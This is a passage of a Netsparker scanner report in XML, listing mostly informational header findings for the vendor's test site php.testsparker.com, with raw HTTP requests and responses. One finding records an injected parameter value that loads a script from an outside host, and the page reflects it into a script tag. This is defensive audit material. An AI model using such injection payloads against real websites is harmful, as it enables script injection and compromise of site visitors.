&lt;SCRIPT language=&quot;JavaScript&quot;&gt;
&lt;!--
window.location=&quot;process.php?file=Generics/index.nsp&quot;;
//--&gt;
&lt;/SCRIPT&gt;
&lt;/HEAD&gt;
&lt;/html&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013></OWASP2013>
							<WASC></WASC>
							<CWE></CWE>
							<CAPEC></CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC>C7</OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:H/RL:O/RC:C</vector>

									<score>
										<type>Base</type>
										<value>5.3</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>5.1</value>
										<severity>Medium</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>5.1</value>
										<severity>Medium</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/</url>
					<type>MissingXssProtectionHeader</type>
					<severity>Information</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker detected a missing &lt;code&gt;X-XSS-Protection&lt;/code&gt; header which means that this website could be at risk of a Cross-site Scripting (XSS) attacks.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;This issue is reported as additional information only. There is no direct impact arising from this issue.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;Add the X-XSS-Protection header with a value of &quot;1; mode= block&quot;.&lt;ul&gt;&lt;li&gt;&lt;pre class=&quot;code&quot;&gt;X-XSS-Protection: 1; mode=block&lt;/pre&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://msdn.microsoft.com/en-us/library/cc288472(VS.85).aspx#_replace&#39;&gt;MSDN - Internet Explorer 8 Security Features&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://blogs.msdn.com/b/ie/archive/2008/07/01/ie8-security-part-iv-the-xss-filter.aspx&#39;&gt;Internet Explorer 8 XSS Filter&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET / HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Content-Length: 144
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:09:14 GMT

&lt;html&gt;
&lt;HEAD&gt;
&lt;SCRIPT language=&quot;JavaScript&quot;&gt;
&lt;!--
window.location=&quot;process.php?file=Generics/index.nsp&quot;;
//--&gt;
&lt;/SCRIPT&gt;
&lt;/HEAD&gt;
&lt;/html&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013></OWASP2013>
							<WASC></WASC>
							<CWE></CWE>
							<CAPEC></CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA>164.308(a)</HIPAA>
							<OWASPPC>C9</OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/auth/login.php</url>
					<type>SameSiteCookieNotImplemented</type>
					<severity>Information</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Cookies are typically sent to third parties in cross origin requests. This can be abused to do CSRF attacks. Recently a new cookie attribute named &lt;em&gt;SameSite&lt;/em&gt; was proposed to disable third-party usage for some cookies, to prevent CSRF attacks.&lt;/p&gt;&lt;p&gt;Same-site cookies allow servers to mitigate the risk of CSRF and information leakage attacks by asserting that a particular cookie should only be sent with requests initiated from the same registrable domain.&lt;/p&gt; ]]></description>
					<impact><![CDATA[  ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;p&gt;The server can set a same-site cookie by adding the SameSite=... attribute to the Set-Cookie header:&lt;/p&gt;&lt;div&gt;&lt;pre&gt;Set-Cookie: key=value; SameSite=strict&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There are two possible values for the same-site attribute:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Lax&lt;/li&gt;&lt;li&gt;Strict&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;In the strict mode, the cookie is not sent with any cross-site usage even if the user follows a link to another website. Lax cookies are only sent with a top-level get request.&lt;/p&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/&#39;&gt;Using the Same-Site Cookies Attribute to Prevent CSRF Attacks&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://tools.ietf.org/html/draft-west-first-party-cookies-07&#39;&gt;Same-site Cookies&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.sjoerdlangkemper.nl/2016/04/14/preventing-csrf-with-samesite-cookie-attribute/&#39;&gt;Preventing CSRF with the same-site cookie attribute&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /auth/login.php HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Referer: http://php.testsparker.com/auth/
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
&lt;span class=&quot;highlight&quot;&gt;Set-Cookie: PHPSESSID=cc357e5fc0d8f52676e059eed885e5be; path=/
&lt;/span&gt;
Server: Apache/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Pragma: no-cache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Content-Length: 3117
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:09:
â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="Identified Cookie(s)">&lt;![CDATA[PHPSESSID]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013></OWASP2013>
							<WASC></WASC>
							<CWE></CWE>
							<CAPEC></CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC>C9</OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/products.php?pro=hTTp%3a%2f%2fr87.com%2fn</url>
					<type>SubResourceIntegrityNotImplemented</type>
					<severity>Information</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Subresource Integrity (SRI) provides a mechanism to check integrity of the resource hosted by third parties like Content Delivery Networks (CDNs) and verifies that the fetched resource has been delivered without unexpected manipulation.&lt;/p&gt;&lt;p&gt;SRI does this using hash comparison mechanism. In this way, hash value declared in HTML elements (for now only script and link elements are supported) will be compared with the hash value of the resource hosted by third party.&lt;/p&gt;&lt;p&gt;Use of SRI is recommended as a best-practice, whenever libraries are loaded from a third-party source.&lt;/p&gt; ]]></description>
					<impact><![CDATA[  ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;p&gt;Using Subresource Integrity is simply to add &lt;em&gt;integrity&lt;/em&gt; attribute to the &lt;em&gt;script&lt;/em&gt; tag along with a base64 encoded cryptographic hash value.&lt;/p&gt;&lt;pre&gt;&amp;lt;script src=&quot;https://code.jquery.com/jquery-2.1.4.min.js&quot; integrity=&quot;sha384-R4/ztc4ZlRqWjqIuvf6RX5yb/v90qNGx6fS48N0tRxiGkqveZETq72KgDVJCp2TC&quot; crossorigin=&quot;anonymous&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/pre&gt;&lt;p&gt;The hash algorithm must be one of &lt;strong&gt;sha256&lt;/strong&gt;, &lt;strong&gt;sha384&lt;/strong&gt; or &lt;strong&gt;sha512&lt;/strong&gt;, followed by a &#39;-&#39; character.&lt;/p&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.w3.org/TR/SRI/&#39;&gt;Subresource Integrity&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://hacks.mozilla.org/2015/09/subresource-integrity-in-firefox-43/&#39;&gt;Do not let your CDN betray you: Use Subresource Integrity&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://speakerdeck.com/jdorfman/web-application-security-with-subresource-integrity&#39;&gt;Web Application Security with Subresource Integrity&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.srihash.org/&#39;&gt;SRI Hash Generator&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET /products.php?pro=hTTp%3a%2f%2fr87.com%2fn HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Cookie: PHPSESSID=cc357e5fc0d8f52676e059eed885e5be
Referer: http://php.testsparker.com/process.php?file=Generics/index.nsp
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[
â€¦&lt;/br&gt;nt=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;title&gt;Netsparker Test Web Site -  PHP&lt;/title&gt;
&lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;
&lt;/head&gt;&lt;script type=text/javascript src = &quot;&lt;span class=&quot;highlight&quot;&gt;hTTp://r87.com/n&lt;/span&gt;&quot; &gt;&lt;/script&gt;
&lt;body&gt;
&lt;div id=&quot;wrapper&quot;&gt;

	&lt;div id=&quot;menu&quot;&gt;
		&lt;ul&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/index.nsp&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;hello.php?name=Visitor&quot;&gt;Hello&lt;/a&gt;&lt;/li&gt;
			&lt;li
â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
							<info name="Identified Sub Resource(s)">&lt;![CDATA[http://r87.com/n]]&gt;</info>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013></OWASP2013>
							<WASC></WASC>
							<CWE></CWE>
							<CAPEC></CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC></OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/</url>
					<type>CspNotImplemented</type>
					<severity>Information</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;CSP is an added layer of security that helps to mitigate mainly Cross-site Scripting attacks.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;CSP can be enabled instructing the browser with a Content-Security-Policy directive in a response header;&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt; Content-Security-Policy: script-src &#39;self&#39;;&lt;/span&gt;&lt;/pre&gt;
&lt;p&gt;or in a meta tag;&lt;/p&gt;
&lt;pre&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;&amp;lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39;;&quot;&amp;gt; &lt;/span&gt;&lt;/pre&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;In the above example, you can restrict script loading only to the same domain. It will also restrict inline script executions both in the element attributes and the event handlers. There are various directives which you can use by declaring CSP:&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;&lt;strong&gt;script-src:&lt;/strong&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt; Restricts the script loading resources to the ones you declared. By default, it disables inline script executions unless you permit to the evaluation functions and inline scripts by the unsafe-eval and unsafe-inline keywords.&lt;/span&gt;&lt;/li&gt;
&lt;li style=&quot;text-align: justify;&quot;&gt;&lt;strong&gt;base-uri:&lt;/strong&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt; Base element is used to resolve relative URL to absolute one. By using this CSP directive, you can define all possible URLs which could be assigned to base-href attribute of the document. &lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;frame-ancestors&lt;/strong&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;: It is very similar to X-Frame-Options HTTP header. It defines the URLs by which the page can be loaded in an iframe.&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;frame-src / child-src&lt;/strong&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;: frame-src is the deprecated version of child-src. Both define the sources that can be loaded by iframe in the page. (Please note that frame-src was brought back in CSP 3)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;object-src&lt;/strong&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt; : Defines the resources that can be loaded by embedding such as Flash files, Java Applets.&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;img-src&lt;/strong&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;: As its name implies, it defines the resources where the images can be loaded from.&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;connect-src&lt;/strong&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;: Defines the whitelisted targets for XMLHttpRequest and WebSocket objects.&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;default-src&lt;/strong&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;: It is a fallback for the directives that mostly ends with -src suffix. When the directives below are not defined, the value set to default-src will be used instead:&lt;/span&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;child-src&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;connect-src&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;font-src&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;img-src&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;manifest-src&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;media-src&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;object-src&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;script-src&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;style-src&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;When setting the CSP directives, you can also use some CSP keywords: &lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li style=&quot;padding-left: 30px;&quot;&gt;&lt;strong&gt;none&lt;/strong&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;: Denies loading resources from anywhere.&lt;/span&gt;&lt;/li&gt;
&lt;li style=&quot;padding-left: 30px;&quot;&gt;&lt;strong&gt;self &lt;/strong&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;: Points to the document&#39;s URL (domain + port).&lt;/span&gt;&lt;/li&gt;
&lt;li style=&quot;padding-left: 30px;&quot;&gt;&lt;strong&gt;unsafe-inline&lt;/strong&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;: Permits running inline scripts.&lt;/span&gt;&lt;/li&gt;
&lt;li style=&quot;padding-left: 30px;&quot;&gt;&lt;strong&gt;unsafe-eval&lt;/strong&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;: Permits execution of evaluation functions such as eval().&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;In addition to CSP keywords, you can also use wildcard or only a scheme when defining whitelist URLs for the points. Wildcard can be used for subdomain and port portions of the URLs:&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Content-Security-Policy: script-src &lt;/span&gt;&lt;a href=&quot;https://example.com&quot;&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;https://*.example.com&lt;/span&gt;&lt;/a&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;;&lt;/span&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Content-Security-Policy: script-src &lt;/span&gt;&lt;a href=&quot;https://example.com&quot;&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;https://example.com&lt;/span&gt;&lt;/a&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;:*;&lt;/span&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Content-Security-Policy: script-src https;&lt;/span&gt;&lt;/pre&gt;
&lt;p style=&quot;text-align: justify;&quot;&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;It is also possible to set a CSP in Report-Only mode instead of forcing it immediately in the migration period. Thus you can see the violations of the CSP policy in the current state of your web site while migrating to CSP:&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Content-Security-Policy-Report-Only: script-src &#39;self&#39;; report-uri: &lt;a href=&quot;https://example.com&quot;&gt;https://example.com&lt;/a&gt;;&lt;/span&gt;&lt;/pre&gt; ]]></description>
					<impact><![CDATA[ &lt;p&gt;There is no direct impact of not implementing CSP on your website. However, if your website is vulnerable to a Cross-site Scripting attack CSP can prevent successful exploitation of that vulnerability. By not implementing CSP youâ€™ll be missing out this extra layer of security.&lt;/p&gt; ]]></impact>
					<actionsToTake><![CDATA[ &lt;ul&gt;
&lt;li&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Enable CSP on your website by sending the &lt;/span&gt;&lt;code&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Content-Security-Policy&lt;/span&gt;&lt;/code&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt; in HTTP response headers that instruct the browser to apply the policies you specified.&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Apply the whitelist and policies as strict as possible.&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Rescan your application to see if Netsparker identifies any weaknesses in your policies.&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt; ]]></actionsToTake>
					<remedy><![CDATA[ &lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Enable CSP on your website by sending the &lt;/span&gt;&lt;code&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Content-Security-Policy&lt;/span&gt;&lt;/code&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt; in HTTP response headers that instruct the browser to apply the policies you specified.&lt;/span&gt;&lt;/p&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.html5rocks.com/en/tutorials/security/content-security-policy/&#39;&gt;An Introduction to Content Security Policy&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://content-security-policy.com/&#39;&gt;Content Security Policy (CSP)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET / HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Content-Length: 144
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:09:14 GMT

&lt;html&gt;
&lt;HEAD&gt;
&lt;SCRIPT language=&quot;JavaScript&quot;&gt;
&lt;!--
window.location=&quot;process.php?file=Generics/index.nsp&quot;;
//--&gt;
&lt;/SCRIPT&gt;
&lt;/HEAD&gt;
&lt;/html&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013></OWASP2013>
							<WASC></WASC>
							<CWE></CWE>
							<CAPEC></CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC>C9</OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/</url>
					<type>ReferrerPolicyNotImplemented</type>
					<severity>Information</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Netsparker detected that no Referrer-Policy header implemented.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Referrer-Policy is a security header designed to prevent cross-domain Referer leakage.&lt;/span&gt;&#160;&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Referer header is a request header that indicates the site which the traffic originated from. If there is no adequate prevention in place, the &#160;URL itself, and even sensitive information contained in the URL will be leaked to the cross-site.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;The lack of Referrer-Policy header might affect privacy of the users and site&#39;s itself&lt;/span&gt;&lt;/p&gt; ]]></impact>
					<actionsToTake><![CDATA[ &lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;In a response header:&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Referrer-Policy: no-referrer | same-origin | origin | strict-origin | no-origin-when-downgrading &lt;/span&gt;&lt;/pre&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;In a META tag&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;&amp;lt;meta name=&quot;Referrer-Policy&quot; value=&quot;no-referrer | same-origin&quot;/&amp;gt;&lt;/span&gt;&lt;/pre&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;In an element attribute&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;&amp;lt;a href=&quot;&lt;/span&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;http://crosssite.example.com&lt;/span&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;&quot; rel=&quot;noreferrer&quot;&amp;gt;&amp;lt;/a&amp;gt; &lt;/span&gt;&lt;/pre&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;or&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;&amp;lt;a href=&quot;&lt;/span&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;http://crosssite.example.com&lt;/span&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;&quot; referrerpolicy=&quot;no-referrer | same-origin | origin | strict-origin | no-origin-when-downgrading&quot;&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/pre&gt; ]]></actionsToTake>
					<remedy><![CDATA[ &lt;p&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Please implement a Referrer-Policy by using the Referrer-Policy response header or by declaring it in the meta tags. Itâ€™s also possible to control referrer information over an HTML-element by using the rel attribute.&lt;/span&gt;&lt;/p&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.w3.org/TR/referrer-policy/&#39;&gt;Referrer Policy&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy&#39;&gt;Referrer-Policy - MDN&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://scotthelme.co.uk/a-new-security-header-referrer-policy/&#39;&gt;A New Security Header: Referrer Policy&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://caniuse.com/#search=referrer%20policy&#39;&gt;Can I Use Referrer-Policy&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[  ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

					<rawrequest>&lt;![CDATA[GET / HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Content-Length: 144
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:09:14 GMT

&lt;html&gt;
&lt;HEAD&gt;
&lt;SCRIPT language=&quot;JavaScript&quot;&gt;
&lt;!--
window.location=&quot;process.php?file=Generics/index.nsp&quot;;
//--&gt;
&lt;/SCRIPT&gt;
&lt;/HEAD&gt;
&lt;/html&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A6</OWASP2013>
							<WASC></WASC>
							<CWE>200</CWE>
							<CAPEC></CAPEC>
							<PCI31></PCI31>
							<PCI32></PCI32>
							<HIPAA></HIPAA>
							<OWASPPC>C9</OWASPPC>

						</classification>

				</vulnerability>
				<vulnerability confirmed="False">
					<url>http://php.testsparker.com/hello.php?name=Visitor</url>
					<type>PossibleInternalWindowsPathLeakage</type>
					<severity>Information</severity>
					<certainty>75</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a possible Internal Path Disclosure (Windows) in the document.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;There is no direct impact, however this information can help an attacker identify other vulnerabilities or help during the exploitation of other identified vulnerabilities.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[  ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;Ensure this is not a false positive. Due to the nature of the issue, Netsparker could not confirm that this file path was actually the real file path of the target web server.&lt;ul&gt;&lt;li&gt;Error messages should be disabled.&lt;/li&gt;&lt;li&gt;Remove this kind of sensitive data from the output.&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[  ]]></requiredSkillsForExploitation>
